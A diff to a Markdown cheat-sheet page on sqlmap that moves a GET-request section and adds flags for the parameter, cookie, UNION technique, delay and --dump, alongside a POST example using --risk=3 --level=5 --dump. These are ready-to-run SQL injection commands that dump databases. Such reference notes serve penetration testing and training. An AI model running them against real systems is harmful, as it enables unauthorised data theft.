@@ -7,6 +7,20 @@ website:
 render_with_liquid: false
 ---
 
+## GET request
+
+```sh
+sqlmap -u "http://10.0.0.1/?search=test"
+# -p: specify the parameter
+sqlmap -u "http://10.0.0.1/?category=test&item=1" -p item 
+
+# --technique=U: UNION attack
+# --delay=2: Time Delay
+sqlmap -u "http://vulnerable.com/?search=1" --cookie="token=3df28a..." --technique=U --delay=2 --dump
+```
+
+<br />
+
 ## POST request
 
 ```sh
@@ -48,15 +62,6 @@ Host: 10.0.0.1
 # --------------------------------------------------------
 
 sqlmap -r request.txt --risk=3 --level=5 --dump
-```
-
-<br />
-
-## GET request
-
-```sh
-sqlmap -u "http://10.0.0.1/?search=test"
-sqlmap -u "http://10.0.0.1/?category=test&item=1" -p item 
 ```
 
 <br />
